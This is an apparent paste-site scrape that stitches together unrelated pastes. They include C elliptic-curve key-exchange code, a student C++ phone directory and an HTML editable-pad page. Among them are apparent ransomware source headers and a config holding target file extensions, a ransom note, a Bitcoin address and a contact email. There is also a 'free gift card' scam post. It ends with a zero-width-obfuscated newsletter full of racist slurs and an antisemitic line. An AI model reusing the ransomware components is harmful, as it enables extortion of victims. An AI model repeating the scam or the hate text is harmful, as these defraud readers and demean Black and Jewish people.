    if (gf2point_is_zero(x1, y1))
    {
      gf2point_copy(x1, y1, x2, y2);
    }
    else
    {
      if (bitvec_equal(x1, x2))
      {
        if (bitvec_equal(y1, y2))
        {
          gf2point_double(x1, y1);
        }
        else
        {
          gf2point_set_zero(x1, y1);
        }
      }
      else
      {
        /* Arithmetic with temporary variables */
        gf2elem_t a, b, c, d;

        gf2field_add(a, y1, y2);
        gf2field_add(b, x1, x2);
        gf2field_inv(c, b);
        gf2field_mul(c, c, a);
        gf2field_mul(d, c, c);
        gf2field_add(d, d, c);
        gf2field_add(d, d, b);
#if (coeff_a == 1)
        gf2field_inc(d);
#endif
        gf2field_add(x1, x1, d);
        gf2field_mul(a, x1, c);
        gf2field_add(a, a, d);
        gf2field_add(y1, y1, a);
        bitvec_copy(x1, d);
      }
    }
  }
}



#if defined(CONST_TIME) && (CONST_TIME == 0)
/* point multiplication via double-and-add algorithm */
static void gf2point_mul(gf2elem_t x, gf2elem_t y, const scalar_t exp)
{
  gf2elem_t tmpx, tmpy;
  int i;
  int nbits = bitvec_degree(exp);

  gf2point_set_zero(tmpx, tmpy);

  for (i = (nbits - 1); i >= 0; --i)
  {
    gf2point_double(tmpx, tmpy);
    if (bitvec_get_bit(exp, i))
    {
      gf2point_add(tmpx, tmpy, x, y);
    }
  }
  gf2point_copy(x, y, tmpx, tmpy);
}
#else
/* point multiplication via double-and-add-always algorithm using scalar blinding */
static void gf2point_mul(gf2elem_t x, gf2elem_t y, const scalar_t exp)
{
  gf2elem_t tmpx, tmpy;
  gf2elem_t dummyx, dummyy;
  int i;
  int nbits = bitvec_degree(exp);

  gf2point_set_zero(tmpx, tmpy);
  gf2point_set_zero(dummyx, dummyy);

  for (i = (nbits - 1); i >= 0; --i)
  {
    gf2point_double(tmpx, tmpy);

    /* Add point if bit(i) is set in exp */
    if (bitvec_get_bit(exp, i))
    {
      gf2point_add(tmpx, tmpy, x, y);
    }
    /* .. or add the neutral element to keep operation constant-time */
    else
    {
      gf2point_add(tmpx, tmpy, dummyx, dummyy);
    }
  }
  gf2point_copy(x, y, tmpx, tmpy);
}
#endif



/* check if y^2 + x*y = x^3 + a*x^2 + coeff_b holds */
static int gf2point_on_curve(const gf2elem_t x, const gf2elem_t y)
{
  gf2elem_t a, b;

  if (gf2point_is_zero(x, y))
  {
    return 1;
  }
  else
  {
    gf2field_mul(a, x, x);
#if (coeff_a == 0)
    gf2field_mul(a, a, x);
#else
    gf2field_mul(b, a, x);
    gf2field_add(a, a, b);
#endif
    gf2field_add(a, a, coeff_b);
    gf2field_mul(b, y, y);
    gf2field_add(a, a, b);
    gf2field_mul(b, x, y);

    return bitvec_equal(a, b);
  }
}


/*************************************************************************************************/
/*
  Elliptic Curve Diffie-Hellman key exchange protocol.
*/
/*************************************************************************************************/



/* NOTE: private should contain random data a-priori! */
int ecdh_generate_keys(uint8_t* public_key, uint8_t* private_key)
{
  /* Get copy of ""base"" point 'G' */
  gf2point_copy((uint32_t*)public_key, (uint32_t*)(public_key + BITVEC_NBYTES), base_x, base_y);

  /* Abort key generation if random number is too small */
  if (bitvec_degree((uint32_t*)private_key) < (CURVE_DEGREE / 2))
  {
    return 0;
  }
  else
  {
    /* Clear bits > CURVE_DEGREE in highest word to satisfy constraint 1 <= exp < n. */
    int nbits = bitvec_degree(base_order);
    int i;

    for (i = (nbits - 1); i < (BITVEC_NWORDS * 32); ++i)
    {
      bitvec_clr_bit((uint32_t*)private_key, i);
    }

    /* Multiply base-point with scalar (private-key) */
    gf2point_mul((uint32_t*)public_key, (uint32_t*)(public_key + BITVEC_NBYTES), (uint32_t*)private_key);

    return 1;
  }
}



int ecdh_shared_secret(const uint8_t* private_key, const uint8_t* others_pub, uint8_t* output)
{
  /* Do some basic validation of other party's public key */
  if (    !gf2point_is_zero ((uint32_t*)others_pub, (uint32_t*)(others_pub + BITVEC_NBYTES))
       &&  gf2point_on_curve((uint32_t*)others_pub, (uint32_t*)(others_pub + BITVEC_NBYTES)) )
  {
    /* Copy other side's public key to output */
    unsigned int i;
    for (i = 0; i < (BITVEC_NBYTES * 2); ++i)
    {
      output[i] = others_pub[i];
    }

    /* Multiply other side's public key with own private key */
    gf2point_mul((uint32_t*)output,(uint32_t*)(output + BITVEC_NBYTES), (const uint32_t*)private_key);

    /* Multiply outcome by cofactor if using ECC CDH-variant: */
#if defined(ECDH_COFACTOR_VARIANT) && (ECDH_COFACTOR_VARIANT == 1)
 #if   (cofactor == 2)
    gf2point_double((uint32_t*)output, (uint32_t*)(output + BITVEC_NBYTES));
 #elif (cofactor == 4)
    gf2point_double((uint32_t*)output, (uint32_t*)(output + BITVEC_NBYTES));
    gf2point_double((uint32_t*)output, (uint32_t*)(output + BITVEC_NBYTES));
 #endif
#endif
    
    return 1;
  }
  else
  {
    return 0;
  }
}"
SHTh545z,main.h,FlyFar,C++,Sunday 24th of March 2024 12:16:57 AM CDT,"#ifndef __LOCKER_MAIN__
#define __LOCKER_MAIN__

#include ""libs/TinyECDH/ecdh.h""
#include ""libs/ChaCha20/chacha20.h""
#include ""libs/SHA256/sha256.h""

#define DEBUG
#ifdef DEBUG
	#include <stdio.h>
#endif

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x)[0])

//-- Core functions
BOOLEAN ChaChaKey1Setup();
VOID ECDHPrivateKeySetup(BYTE *input, int incount);
VOID MountVolumes();
VOID ServiceFucker();
VOID ProcessFucker();
VOID ShadowFucker();
VOID SearchLAN(LPNETRESOURCEW resourcename);
DWORD WINAPI SearchFilesThreaded(LPVOID lpParam);
VOID SearchFiles(WCHAR *pathname, int layer);
VOID CryptFile(const WCHAR *filename);

//-- Util functions
BOOL myIsWow64Process();
PCHAR *CommandLineToArgvA(PCHAR CmdLine, int *_argc);
LPVOID myHeapAlloc(int len);
VOID   myHeapFree(LPVOID mem);

//-- Unmanaged imports
typedef BOOL WINAPI(*pdef_IsWow64Process)(HANDLE hProcess, PBOOL bResult);
typedef BOOL WINAPI(*pdef_Wow64DisableWow64FsRedirection)(PVOID *OldValue);
typedef BOOL WINAPI(*pdef_Wow64RevertWow64FsRedirection)(PVOID OldValue);
typedef BOOLEAN WINAPI(*pdef_RtlGenRandom)(PVOID RandomBuffer,ULONG RandomBufferLength);

//-- Global variables
BYTE CHACHA20KEY_1[88];
BYTE CHACHA20KEY_2[44];

BYTE CHACHA20_FINAL_KEY_1[32];
BYTE CHACHA20_FINAL_KEY_2[32];

BYTE CHACHA20NONCE_1[12];
BYTE CHACHA20NONCE_2[12];

BYTE CHACHA20_FINAL_NONCE[12];

BYTE VICTIM_ECDH_PUBLIC_KEY[ECC_PUB_KEY_SIZE];
BYTE VICTIM_ECDH_PRIVATE_KEY[ECC_PRV_KEY_SIZE];

BYTE ECDH_SHARED_SECRET[ECC_PUB_KEY_SIZE];

CRITICAL_SECTION critSection;

#endif"
T88bhjKT,week3,excellent940707,C++,Sunday 24th of March 2024 12:16:26 AM CDT,"#include <iostream>
using namespace std;

// Assuming a maximum of 10 entries in the directory
const int DIRECTORY_SIZE = 10;
// Array of pointers to names (C-style strings)
const char *names[DIRECTORY_SIZE] = {""Amy"", ""Brian"", ""Cindy"", ""David"", ""Eric""};
// Array of pointers to phone numbers (C-style strings)
const char *phoneNumbers[DIRECTORY_SIZE] = {""0987654321"", ""0912345678"", ""0911111111"", ""0922222222"",""0933333333""};
// Function prototypes
void printDirectory();
void findPhoneNumber(const char *name);
void updatePhoneNumber(const char *name, const char *newNumber);

int main() {
 // Program entry point
 int act;
 char text[20], text2[10];
 while(cin>>act){
  if(act==1){
    printDirectory();
  }else if(act==2){
    cin.ignore();
    cin.getline(text, 20);
    findPhoneNumber(text);
  }else{
    cin.ignore();
    cin.getline(text, 20);
    cin.getline(text2, 10);
    cout<<text2<<'\n';
    updatePhoneNumber(text, text2);
  }
 }
 return 0;
}

// Implement the functions here
void printDirectory(){
  for(int i=0;i<DIRECTORY_SIZE;++i)
    if(names[i])cout<<""name: ""<<names[i]<<' '<<""phone number: ""<<phoneNumbers[i]<<'\n';
}

void findPhoneNumber(const char*name){
  for(int i=0;i<DIRECTORY_SIZE;++i){
    if(names[i]){
      bool flag=1;
      for(int j=0;names[i][j]!='\0';++j){
        if(name[j]=='\0'){
          flag=0;
          break;
        }else if(names[i][j]!=name[j]){
          flag=0;
          break;
        }
      }
      if(flag){
        cout<<""name: ""<<names[i]<<' '<<""phone number: ""<<phoneNumbers[i]<<'\n';
        return;
      }
    }
  }
  cout<<""Not find\n"";
}

void updatePhoneNumber(const char *name, const char *newNumber){
  for(int i=0;i<DIRECTORY_SIZE;++i){
    if(names[i]){
      bool flag=1;
      for(int j=0;names[i][j]!='\0';++j){
        if(name[j]=='\0'){
          flag=0;
          break;
        }else if(names[i][j]!=name[j]){
          flag=0;
          break;
        }
      }
      if(flag){
        phoneNumbers[i]=newNumber;
        cout<<""Update successful!\n"";
        return;
      }
    }
  }
  cout<<""Update falid!\n"";
}"
90LV104D,config.h,FlyFar,C++,Sunday 24th of March 2024 12:06:20 AM CDT,"#ifndef __CONFIG_H__
#define __CONFIG_H__

#define MASTER_RSA_PUB L""MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"" \
                       ""hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w"" \
                       ""VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E"" \
                       ""ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB""

#define FILE_EXT_WHITE L"".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb"" \
                       L"".gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln""  \
                       L"".sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.""
                       
#define FOLDER_BLCKLST L""C:\\Windows;""

//
#define RANSOM_NOTE_EML1 L""wowsmith123456@posteo.net""

#define BITCOIN_ADDRESS1 L""1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX""

#define RANSOM_NOTE_NAME L""README.TXT""

#define RANSOM_NOTE_TXT1 L""Ooops, your important files are encrypted.\r\n"" \
						 L""\r\n"" \
						 L""If you see this text, then your files are no longer accessible, because\r\n"" \
						 L""they have been encrypted. Perhaps you are busy looking for a way to recover\r\n"" \
						 L""your files, but don't waste your time. Nobody can recover your files without\r\n"" \
						 L""our decryption service.\r\n"" \
						 L""\r\n"" \
						 L""We guarantee that you can recover all your files safely and easily.\r\n"" \
						 L""All you need to do is submit the payment and purchase the decryption key.\r\n"" \
						 L""\r\n"" \
						 L""Please follow the instructions:\r\n"" \
						 L""\r\n"" \
						 L""1.\tSend $300 worth of Bitcoin to following address:\r\n"" \
						 L""\r\n""
						 
#define RANSOM_NOTE_TXT2 L""2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ""

#define RANSOM_NOTE_TXT3 L""\tYour personal installation key:\r\n\r\n""

#define MAX_BLOCK_NCRYPT 0x100000

#define TIME_WAIT_DEFAULT 1;

#endif"
p7VB7LGU,main.h,FlyFar,C++,Sunday 24th of March 2024 12:05:17 AM CDT,"#ifndef __MAIN_H__
#define __MAIN_H__

#include ""config.h""

typedef struct
{
	WCHAR *RootPathName;
	CONST WCHAR *hRSAKeyStr;
	BOOL   bUnknown;
	HCRYPTPROV hProv;
	HCRYPTKEY  hAESKey;
	HCRYPTKEY  hRSAKey;
	HANDLE hDriveHandle;
} RANSOM_STRUCT;

DWORD WINAPI enum_drive(LPVOID lpParam);
BOOL gen_aes_key(RANSOM_STRUCT *crypto_struct);
VOID enum_files(WCHAR *zePath, int recursion_count, RANSOM_STRUCT *crypto_struct);
VOID encrypt_file(WCHAR *zeFile, RANSOM_STRUCT *crypto_struct);
VOID write_note(RANSOM_STRUCT *crypto_struct);
BOOL import_rsa_key(RANSOM_STRUCT *crypto_struct);
WCHAR *export_aes_key(RANSOM_STRUCT *crypto_struct);
DWORD GetRandomNumber();

#endif"
LmwV3TJj,content_editable_browser_pad,Python253,HTML,Saturday 23rd of March 2024 11:59:20 PM CDT,"<!--
HTML Document: Content Editable Browser Pad

This HTML document creates a simple browser pad with a contenteditable div element. 
Users can type, edit, and modify the content within the div directly in their web browser. 
The pad has a minimum height of 400 pixels and is bordered with a 2-pixel solid line in light gray color for visual distinction. 
Additionally, the padding inside the div is set to 10 pixels.

Attributes:
- lang: Specifies the language of the document (English).
- charset: Defines the character encoding for the document (UTF-8).
- viewport: Sets the initial scale and width of the viewport for responsive design.
- title: Specifies the title of the document displayed in the browser tab.

Tags Used:
- html: The root element of an HTML document.
- head: Contains meta-information about the HTML document.
- meta: Provides metadata about the HTML document, such as character encoding and viewport settings.
- title: Defines the title of the HTML document.
- body: Represents the content of the HTML document.
- div: A block-level element used to create a container with editable content.
- contenteditable: Specifies whether the content of the div element is editable by the user.

Styling:
- min-height: Sets the minimum height of the contenteditable div to 400 pixels.
- border: Applies a 2-pixel solid border around the contenteditable div, colored in light gray (#ccc).
- padding: Adds 10 pixels of padding inside the contenteditable div for better spacing.

Usage:
- Users can open this HTML document in any web browser and start typing or editing content directly within the contenteditable div. 
The browser pad can be useful for taking notes, drafting text, or any other purpose where quick and simple text editing is required.

Note:
- Users can directly embed JavaScript code in the address bar of their web browser to execute scripts on the current web page. However, caution should be exercised when executing arbitrary JavaScript code obtained from untrusted sources, as it may pose security risks.

How To Embed:
- Input the following command into an empty address bar: 
  data:text/html,<html contenteditable><body>Type Anything Here. You Can Even Imbed Your Own JavaScript...</body></html>

-->

<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>Content Editable Browser Pad</title>
</head>
<body>
  <div contenteditable=""true"" style=""min-height: 400px; border: 2px solid #ccc; padding: 10px;"">
  </div>
</body>
</html>
"
p7VjWvwZ,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Saturday 23rd of March 2024 11:58:57 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
24 March 2024















































"
Wyu7M4FD,News March23 24,Newscaster_Ned,Email,Saturday 23rd of March 2024 11:55:56 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎,‎ ‎t‎h‎e‎n‎ ‎h‎i‎t‎ ‎t‎h‎e‎ ‎s‎n‎o‎o‎z‎e‎.‎

K‎a‎m‎a‎l‎a‎ ‎C‎o‎m‎e‎s‎ ‎f‎o‎r‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎s‎ ‎G‎u‎n‎s‎

B‎i‎d‎e‎n‎ ‎D‎i‎s‎p‎a‎t‎c‎h‎e‎s‎ ‎V‎E‎E‎P‎ ‎t‎o‎ ‎F‎u‎n‎d‎ ‎R‎e‎d‎ ‎F‎l‎a‎g‎ ‎L‎a‎w‎s‎
U‎.‎S‎.‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎m‎a‎k‎e‎s‎ ‎s‎t‎a‎t‎e‎m‎e‎n‎t‎s‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎ ‎p‎r‎e‎s‎s‎ ‎c‎o‎n‎f‎e‎r‎e‎n‎c‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎R‎o‎m‎a‎
O‎n‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎,‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎s‎p‎o‎k‎e‎ ‎f‎r‎o‎m‎ ‎M‎a‎r‎j‎o‎r‎y‎ ‎S‎t‎o‎n‎e‎m‎a‎n‎ ‎D‎o‎u‎g‎l‎a‎s‎ ‎h‎i‎g‎h‎ ‎s‎c‎h‎o‎o‎l‎ ‎a‎n‎d‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎t‎h‎r‎e‎e‎ ‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎a‎ ‎b‎i‎l‎l‎i‎o‎n‎ ‎d‎o‎l‎l‎a‎r‎s‎ ‎b‎e‎i‎n‎g‎ ‎d‎e‎d‎i‎c‎a‎t‎e‎d‎ ‎t‎o‎ ‎s‎e‎c‎u‎r‎i‎n‎g‎ ‎m‎o‎r‎e‎ ‎r‎e‎d‎ ‎f‎l‎a‎g‎ ‎l‎a‎w‎s‎.‎ ‎


W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎H‎a‎s‎ ‎S‎t‎r‎o‎n‎g‎ ‎R‎e‎c‎o‎v‎e‎r‎y‎,‎ ‎B‎u‎t‎ ‎P‎e‎o‎p‎l‎e‎ ‎‘‎B‎u‎s‎y‎’‎ ‎a‎n‎d‎ ‎W‎a‎t‎c‎h‎ ‎‘‎T‎h‎e‎ ‎B‎a‎c‎h‎e‎l‎o‎r‎
W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎H‎a‎s‎ ‎G‎o‎o‎d‎ ‎R‎e‎c‎o‎v‎e‎r‎y‎,‎ ‎P‎e‎o‎p‎l‎e‎ ‎D‎o‎n‎'‎t‎ ‎F‎o‎l‎l‎o‎w‎ ‎N‎e‎w‎s‎ ‎C‎o‎n‎s‎t‎a‎n‎t‎l‎y‎
1‎,‎5‎5‎3‎
W‎y‎o‎m‎i‎n‎g‎ ‎B‎a‎n‎s‎ ‎‘‎G‎e‎n‎d‎e‎r‎-‎R‎e‎a‎s‎s‎i‎g‎n‎m‎e‎n‎t‎,‎’‎ ‎P‎u‎b‎e‎r‎t‎y‎ ‎B‎l‎o‎c‎k‎i‎n‎g‎ ‎P‎r‎o‎c‎e‎d‎u‎r‎e‎s‎ ‎f‎o‎r‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎
W‎y‎o‎m‎i‎n‎g‎ ‎B‎a‎n‎s‎ ‎'‎G‎e‎n‎d‎e‎r‎-‎R‎e‎a‎s‎s‎i‎g‎n‎m‎e‎n‎t‎'‎ ‎P‎r‎o‎c‎e‎d‎u‎r‎e‎s‎ ‎f‎o‎r‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎
1‎8‎4‎
P‎o‎l‎i‎c‎e‎:‎ ‎S‎q‎u‎a‎t‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎N‎Y‎C‎ ‎W‎o‎m‎a‎n‎’‎s‎ ‎B‎o‎d‎y‎ ‎F‎o‎u‎n‎d‎ ‎S‎t‎u‎f‎f‎e‎d‎ ‎i‎n‎ ‎D‎u‎f‎f‎e‎l‎ ‎B‎a‎g‎
P‎o‎l‎i‎c‎e‎:‎ ‎S‎q‎u‎a‎t‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎N‎Y‎C‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎B‎o‎d‎y‎ ‎F‎o‎u‎n‎d‎ ‎i‎n‎ ‎D‎u‎f‎f‎e‎l‎ ‎B‎a‎g‎
2‎6‎4‎
K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎T‎h‎r‎e‎e‎ ‎Q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎a‎ ‎B‎i‎l‎l‎i‎o‎n‎ ‎D‎o‎l‎l‎a‎r‎s‎ ‎f‎o‎r‎ ‎M‎o‎r‎e‎ ‎R‎e‎d‎ ‎F‎l‎a‎g‎ ‎L‎a‎w‎s‎
V‎P‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎$‎7‎5‎0‎ ‎M‎i‎l‎l‎i‎o‎n‎ ‎f‎o‎r‎ ‎M‎o‎r‎e‎ ‎R‎e‎d‎ ‎F‎l‎a‎g‎ ‎L‎a‎w‎s‎
7‎8‎1‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎h‎a‎t‎ ‎L‎e‎f‎t‎ ‎A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎1‎5‎ ‎D‎e‎a‎d‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎
4‎,‎0‎4‎0‎
‘‎B‎l‎u‎e‎-‎E‎y‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎D‎e‎v‎i‎l‎s‎’‎:‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎c‎i‎s‎t‎ ‎R‎a‎n‎t‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎A‎i‎r‎l‎i‎n‎e‎s‎ ‎F‎
F‎l‎o‎r‎i‎d‎a‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎c‎i‎s‎t‎ ‎R‎a‎n‎t‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎A‎i‎r‎l‎i‎n‎e‎s‎ ‎F‎l‎i‎g‎h‎t‎
3‎0‎5‎
M‎c‎C‎a‎r‎t‎h‎y‎:‎ ‎‘‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎L‎o‎s‎t‎ ‎t‎h‎e‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎’‎ ‎W‎h‎e‎n‎ ‎G‎a‎e‎t‎z‎ ‎L‎e‎d‎ ‎M‎y‎ ‎O‎u‎s‎t‎e‎r‎
M‎c‎C‎a‎r‎t‎h‎y‎:‎ ‎G‎O‎P‎ ‎L‎o‎s‎t‎ ‎t‎h‎e‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎W‎h‎e‎n‎ ‎G‎a‎e‎t‎z‎ ‎L‎e‎d‎ ‎M‎y‎ ‎O‎u‎s‎t‎e‎r‎
1‎,‎6‎4‎8‎
T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎G‎e‎t‎ ‎$‎3‎.‎5‎B‎ ‎W‎i‎n‎d‎f‎a‎l‎l‎ ‎a‎f‎t‎e‎r‎ ‎S‎h‎a‎r‎e‎h‎o‎l‎d‎e‎r‎s‎ ‎A‎p‎p‎r‎o‎v‎e‎ ‎T‎r‎u‎t‎h‎ ‎S‎o‎c‎i‎a‎l‎ ‎M‎e‎r‎g‎e‎r‎
T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎G‎e‎t‎ ‎$‎3‎.‎5‎B‎ ‎W‎i‎n‎d‎f‎a‎l‎l‎ ‎a‎f‎t‎e‎r‎ ‎S‎h‎a‎r‎e‎h‎o‎l‎d‎e‎r‎s‎ ‎O‎K‎ ‎T‎r‎u‎t‎h‎ ‎S‎o‎c‎i‎a‎l‎ ‎M‎e‎r‎g‎e‎r‎
4‎,‎1‎0‎3‎
R‎e‎p‎o‎r‎t‎s‎:‎ ‎O‎n‎g‎o‎i‎n‎g‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎S‎h‎o‎o‎t‎o‎u‎t‎ ‎a‎t‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎L‎e‎a‎v‎e‎s‎ ‎a‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎0‎0‎ ‎C‎a‎s‎u‎a‎l‎t‎i‎e‎s‎
T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎S‎h‎o‎o‎t‎o‎u‎t‎ ‎a‎t‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎L‎e‎a‎v‎e‎s‎ ‎a‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎0‎0‎ ‎C‎a‎s‎u‎a‎l‎t‎i‎e‎s‎
5‎,‎3‎7‎1‎
S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎
S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎

H‎u‎n‎t‎i‎n‎g‎t‎o‎n‎ ‎B‎e‎a‎c‎h‎ ‎C‎o‎o‎n‎ ‎S‎t‎a‎b‎s‎ ‎2‎ ‎P‎e‎o‎p‎l‎e‎ ‎a‎n‎d‎ ‎R‎a‎p‎e‎s‎ ‎1‎ ‎W‎o‎m‎a‎n‎.‎

Q‎u‎i‎t‎e‎ ‎a‎c‎c‎o‎m‎p‎l‎i‎s‎h‎e‎d‎,‎ ‎n‎e‎g‎r‎o‎.‎


L‎a‎s‎ ‎V‎e‎g‎a‎s‎ ‎N‎e‎g‎r‎o‎ ‎S‎o‎c‎i‎a‎l‎ ‎W‎o‎r‎k‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎S‎e‎x‎u‎a‎l‎ ‎A‎s‎s‎a‎u‎l‎t‎.‎


N‎i‎g‎ ‎G‎e‎t‎s‎ ‎2‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎p‎i‎n‎g‎ ‎C‎o‎r‎p‎s‎e‎ ‎a‎t‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎F‎u‎n‎e‎r‎a‎l‎ ‎H‎o‎m‎e‎.‎


C‎o‎r‎p‎u‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎ ‎B‎a‎b‎o‎o‎n‎ ‎R‎a‎p‎e‎s‎ ‎2‎ ‎W‎o‎m‎e‎n‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎J‎e‎w‎s‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎D‎a‎l‎e‎,‎ ‎T‎X‎
A‎s‎ ‎o‎f‎ ‎8‎:‎3‎1‎ ‎a‎m‎ ‎C‎D‎T‎
T‎o‎d‎a‎y‎
